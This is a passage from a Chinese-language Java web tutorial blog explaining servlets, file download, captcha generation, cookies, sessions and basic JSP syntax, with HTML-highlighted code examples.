class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="HttpServletResponse"><a href="#HttpServletResponse" class="headerlink" title="HttpServletResponse"></a>HttpServletResponse</h3><p>web服务器接收到客户端的http请求，会针对这个请求，分别创建一个代表请求的HttpServletRequest对象，代表响应的一个HttpServletResponse</p>
<ul>
<li>如果要获取客户端请求过来的参数：找HttpServletRequest</li>
<li>如果要给客户端响应一些个信息，找HttpServletResponse</li>
</ul>
<p><a href="https://www.cnblogs.com/xdp-gacl/p/3798347.html">https://www.cnblogs.com/xdp-gacl/p/3798347.html</a></p>
<p>常见应用：</p>
<ul>
<li><p>向浏览器输出消息</p>
</li>
<li><p>下载文件：</p>
<ul>
<li>要获取下载文件的路径</li>
<li>下载的文件名字是什么</li>
<li>设置想办法让浏览器能支持我们下载的东西</li>
<li>获取下载文件的输入流</li>
<li>创建缓冲区</li>
<li>获取OutPutStream对象</li>
<li>将FileOutPutStream写入到缓冲区Buffer</li>
<li>将Buffer中的数据输出到客户端</li>
</ul>
</li>
</ul>
<h4 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.kuang.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletOutputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">realPath</span> <span class="operator">=</span> <span class="string">&quot;C:\\Users\\Liyc\\IdeaProjects\\javaweb-1-study\\servlet-03\\target\\classes\\1.jpg&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;Download path: &quot;</span>+realPath);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取下载的文件名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> realPath.substring(realPath.lastIndexOf(<span class="string">&quot;\\&quot;</span>) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置浏览器行为</span></span><br><span class="line">        resp.setHeader(<span class="string">&quot;Content-disposition&quot;</span>,<span class="string">&quot;attachment;filename=&quot;</span>+fileName);</span><br><span class="line">        <span class="comment">//获取下载文件的输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(realPath);</span><br><span class="line">        <span class="comment">//创建缓冲区</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="comment">//获取到输出流对象</span></span><br><span class="line">        <span class="type">ServletOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> resp.getOutputStream();</span><br><span class="line">        <span class="comment">//将文件输入流写入到buffer缓冲区，使用OutputStream输出到客户端</span></span><br><span class="line">        <span class="keyword">while</span>((len=in.read(buffer))&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            out.write(buffer,<span class="number">0</span>,len);</span><br><span class="line">        &#125;</span><br><span class="line">        in.close();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="实现后端验证码"><a href="#实现后端验证码" class="headerlink" title="实现后端验证码"></a>实现后端验证码</h4><p>需要用到java的图片类，生成一个图片</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.kuang.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.imageio.ImageIO;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.image.BufferedImage;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ImageServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">//让浏览器五秒刷新一次</span></span><br><span class="line">        resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;5&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//在内存中生成一个图片</span></span><br><span class="line">        <span class="type">BufferedImage</span> <span class="variable">bufferedImage</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedImage</span>(<span class="number">200</span>,<span class="number">40</span>,BufferedImage.TYPE_INT_RGB);</span><br><span class="line">        <span class="comment">//得到图片</span></span><br><span class="line">        <span class="type">Graphics2D</span> <span class="variable">graphics</span> <span class="operator">=</span> (Graphics2D) bufferedImage.getGraphics();<span class="comment">//画笔</span></span><br><span class="line">        graphics.setColor(Color.MAGENTA);</span><br><span class="line">        graphics.fillRect(<span class="number">0</span>,<span class="number">0</span>,<span class="number">200</span>,<span class="number">40</span>);</span><br><span class="line">        <span class="comment">//给图片写数据</span></span><br><span class="line">        graphics.setColor(Color.BLUE);</span><br><span class="line">        graphics.setFont(<span class="keyword">new</span> <span class="title class_">Font</span>(<span class="literal">null</span>,Font.BOLD,<span class="number">20</span>));</span><br><span class="line">        graphics.drawString(makeNum(),<span class="number">100</span>,<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//告诉浏览器这个请求用图片的方式打开</span></span><br><span class="line">        resp.setContentType(<span class="string">&quot;image/jpeg&quot;</span>);</span><br><span class="line">        resp.setDateHeader(<span class="string">&quot;expires&quot;</span>,-<span class="number">1</span>);<span class="comment">//缓存控制</span></span><br><span class="line">        resp.setHeader(<span class="string">&quot;Cache-Control&quot;</span>,<span class="string">&quot;no-cache&quot;</span>);</span><br><span class="line">        resp.setHeader(<span class="string">&quot;Pragma&quot;</span>,<span class="string">&quot;no-cache&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//把图片写道浏览器</span></span><br><span class="line">        ImageIO.write(bufferedImage,<span class="string">&quot;jpg&quot;</span>,resp.getOutputStream());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//生成随机数</span></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">makeNum</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">num</span> <span class="operator">=</span> random.nextInt(<span class="number">9999</span>) + <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">4</span>-num.length(); i++) &#123;</span><br><span class="line">            sb.append(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString() + num;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://o.130014.xyz/2022/03/03/33bba4a6ee5f567669c78bcee74b9a6-20220303002134-xeyc728.png" alt="33bba4a6ee5f567669c78bcee74b9a6-20220303002134-xeyc728.png"></p>
<h4 id="实现重定向（-）"><a href="#实现重定向（-）" class="headerlink" title="实现重定向（*）"></a>实现重定向（*）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">resp.sendRedirect(<span class="string">&quot;/s3/image&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="HttpServletRequest"><a href="#HttpServletRequest" class="headerlink" title="HttpServletRequest"></a>HttpServletRequest</h3><p>处理客户端发来的http请求并处理</p>
<h4 id="1-获取前端传递的参数"><a href="#1-获取前端传递的参数" class="headerlink" title="1.获取前端传递的参数"></a>1.获取前端传递的参数</h4><p>index.jsp</p>
<p>以post的方式提交表单</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;登录&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;$&#123;pageContext.request.contextPath&#125;/login&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">    &lt;h1&gt;Login&lt;/h1&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> placeholder=<span class="string">&quot;Username&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> placeholder=<span class="string">&quot;password&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;checkbox&quot;</span> name=<span class="string">&quot;hobbies&quot;</span> value=<span class="string">&quot;Video game&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;checkbox&quot;</span> name=<span class="string">&quot;hobbies&quot;</span> value=<span class="string">&quot;Animation&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;checkbox&quot;</span> name=<span class="string">&quot;hobbies&quot;</span> value=<span class="string">&quot;Football&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;&quot;</span> value=<span class="string">&quot;Login&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>写一个Servlet来获取参数和请求转发</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        req.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">        String[] hobbies = req.getParameterValues(<span class="string">&quot;hobbies&quot;</span>);</span><br><span class="line">  </span><br><span class="line">        System.out.println(username);</span><br><span class="line">        System.out.println(password);</span><br><span class="line">        System.out.println(Arrays.toString(hobbies));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过请求转发</span></span><br><span class="line">        req.getRequestDispatcher(<span class="string">&quot;/success.jsp&quot;</span>).forward(req,resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-请求转发"><a href="#2-请求转发" class="headerlink" title="2.请求转发"></a>2.请求转发</h4><h2 id="实现Cookie"><a href="#实现Cookie" class="headerlink" title="实现Cookie"></a>实现Cookie</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CookieDemo</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        req.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        resp.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Cookie 服务端到客户端获取</span></span><br><span class="line">        Cookie[] cookies = req.getCookies();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cookies!=<span class="literal">null</span>)&#123;</span><br><span class="line">            out.write(<span class="string">&quot;你上一次访问的时间是：&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (Cookie cookie:cookies</span><br><span class="line">                 ) &#123;</span><br><span class="line">                <span class="keyword">if</span>(cookie.getName().equals(<span class="string">&quot;loginTime&quot;</span>))&#123;</span><br><span class="line">                    <span class="comment">//获取cookie中的值</span></span><br><span class="line">                    <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> cookie.getValue();</span><br><span class="line">                    <span class="type">long</span> <span class="variable">time</span> <span class="operator">=</span> Long.parseLong(value);</span><br><span class="line">                    <span class="type">Date</span> <span class="variable">date</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>(time);</span><br><span class="line">                    out.write(date.toLocaleString());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            out.write(<span class="string">&quot;这是第一次访问&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;loginTime&quot;</span>, System.currentTimeMillis()+<span class="string">&quot;&quot;</span>);</span><br><span class="line">        resp.addCookie(cookie);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h2><p>在web.xml中可以配置session的一些配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">session-config</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--      15分钟失效      --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">session-timeout</span>&gt;</span>15<span class="tag">&lt;/<span class="name">session-timeout</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">session-config</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p>实现session中读取数据功能</p>
<p>存数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SessionDemo</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">//解决乱码</span></span><br><span class="line">        req.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        resp.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//得到Session</span></span><br><span class="line">        <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> req.getSession();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//给Session中存东西</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">xianbei</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;xianbei&quot;</span>, <span class="number">20</span>);</span><br><span class="line">        session.setAttribute(<span class="string">&quot;name&quot;</span>,xianbei);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取Session的ID</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> session.getId();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断Session是不是新创建</span></span><br><span class="line">        <span class="keyword">if</span>(session.isNew())&#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;session创建成功，id:&quot;</span>+session);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;session已经存在&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>取数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SessionDemo02</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">//解决乱码</span></span><br><span class="line">        req.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        resp.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//得到Session</span></span><br><span class="line">        <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> req.getSession();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取Session</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">name</span> <span class="operator">=</span> session.getAttribute(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        resp.getWriter().write(name.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h1><h2 id="jsp原理"><a href="#jsp原理" class="headerlink" title="jsp原理"></a>jsp原理</h2><p>Java Server Pages</p>
<p><a href="https://cloud.tencent.com/developer/article/1174274">https://cloud.tencent.com/developer/article/1174274</a></p>
<p>JSP其实是对Servlet进行了包装而已。<br>jsp + java类（service、javabean）+ servlet，就会构成mvc的开发模式，mvc模式是目前软件公司中相当通用的开发模式。</p>
<p><img src="https://o.130014.xyz/2022/03/03/image-20220303085421-wqpfc5h.png" alt="image-20220303085421-wqpfc5h.png"></p>
<p>浏览器向服务器发出什么请求，都是在访问Servlet</p>
<p>1.判断请求</p>
<p>2.内置一些对象</p>
<h2 id="jsp基础语法和指令"><a href="#jsp基础语法和指令" class="headerlink" title="jsp基础语法和指令"></a>jsp基础语法和指令</h2><p><a href="https://www.cnblogs.com/qlqwjy/p/8943061.html">https://www.cnblogs.com/qlqwjy/p/8943061.html</a></p>
<p>maven配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--Servlet依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--jsp依赖 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/javax.servlet.jsp/javax.servlet.jsp-api --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet.jsp-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--   JSTL表达式依赖   --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/javax.servlet.jsp.jstl/jstl-api --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp.jstl<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- standard标签依赖  --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/taglibs/standard --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>taglibs<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>standard<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="JSP表达式"><a href="#JSP表达式" class="headerlink" title="JSP表达式"></a>JSP表达式</h3><p>将程序的结果输出到客户端</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;$Title$&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%= <span class="keyword">new</span> <span class="title class_">java</span>.util.Date()%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%= 变量或者表达式 %&gt;</span><br></pre></td></tr></table></figure>

<p>JSP脚本片段</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        sum+=i;</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(sum);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>JSP声明：会被编译到JSP生成的类中，其他的会被生成到_jspService方法中</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h3 id="JSP注释-在查看页面源码的时候不会看见"><a href="#JSP注释-在查看页面源码的时候不会看见" class="headerlink" title="JSP注释(在查看页面源码的时候不会看见)"></a>JSP注释(在查看页面源码的时候不会看见)</h3><table>
<thead>
<tr>
<th><strong>语法</strong></th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>&lt;%– 注释 –%&gt;</td>
<td>JSP注释，注释内容不会被发送至浏览器甚至不会被编译</td>
</tr>
<tr>
<td><!-- 注释 --></td>
<td>HTML注释，通过浏览器查看网页源代码时可以看见注释内容</td>
</tr>
<tr>
<td>&lt;%</td>
<td>代表静态 &lt;%常量</td>
</tr>
<tr>
<td>%&gt;</td>
<td>代表静态 %&gt; 常量</td>
</tr>
<tr>
<td>&#39;</td>
<td>在属性中使用的单引号</td>
</tr>
<tr>
<td>&quot;</td>
<td>在属性中使用的双引号</td>
</tr>
</tbody></table>
<h3 id="JSP指令"><a href="#JSP指令" class="headerlink" title="JSP指令"></a>JSP指令</h3><p>JSP指令用来设置与整个JSP页面相关的属性。</p>
<table>
<thead>
<tr>
<th><strong>指令</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>&lt;%@ page … %&gt;</td>
<td>定义页面的依赖属性，比如脚本语言、error页面、缓存需求等等</td>
</tr>
<tr>
<td>&lt;%@ include … %&gt;</td>
<td>包含其他文件</td>
</tr>
<tr>
<td>&lt;%@ taglib … %&gt;</td>
